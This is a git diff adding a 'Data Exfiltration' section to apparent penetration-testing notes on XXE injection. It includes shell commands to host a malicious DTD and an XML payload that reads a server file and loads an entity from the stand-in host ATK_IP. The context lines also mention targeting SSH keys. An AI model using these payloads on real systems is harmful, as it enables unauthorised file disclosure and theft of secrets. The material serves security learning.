@@ -94,3 +94,32 @@ Most commonly we are looking for SSH keys or trying to make the XML call out so 
 ```
 > We need to try to avoid using things that could break the syntax of XML or the code (eg. `$IFS` instead of spaces)
 > SSRF may also be possible through XXE
+
+## Data Exfiltration
+Due to XML having syntax issues when reading some files, we need ways to encode and exfiltrate data reliably. We could use things like PHP's base64 encode filter wrapper but that obviously doesn't work for other apps.
+
+### CDATA
+We can wrap the data with the `CDATA` tag `<![CDATA[ file_content ]]>`. This will make the XML parser consider the data as raw data and not attempt to parse it.
+
+As XML won't join *Internal* & *External* entities together, we need to use *XML Parameter Entities* which can be defined in a DTD using `%` instead of `&` when referencing the entities in the `joined` entity. This means that if we reference it from an external source (eg. our web server) XML treats them all as external entities and then can join them.
+
+Ideally, we can store this data on our web server and reference it as external. We could store `xxe.dtd` and host a simple web server, then we could submit the XXE payload with the `CDATA` wrapper:
+```bash
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+python -m http.server 8080
+```
+```xml
+<!DOCTYPE email [
+	<!ENTITY % begin "<![CDATA[">
+	<!ENTITY % file SYSTEM "file:///var/www/html/index.js">
+	<!ENTITY % end "]]>">
+	<!ENTITY % xxe SYSTEM "http://ATK_IP:8080/xxe.dtd">
+	%xxe;
+]>
+...
+<email>&joined;</email>
+```
+> Due to file/entity self-referencing, the web server may prevent us from referencing some files (eg. *index*)
+
+### Error-based XXE
+If errors are exposed on the application then we may be able to extract data via these. We may be blind to the actual XML output but we can still use the errors as a medium.
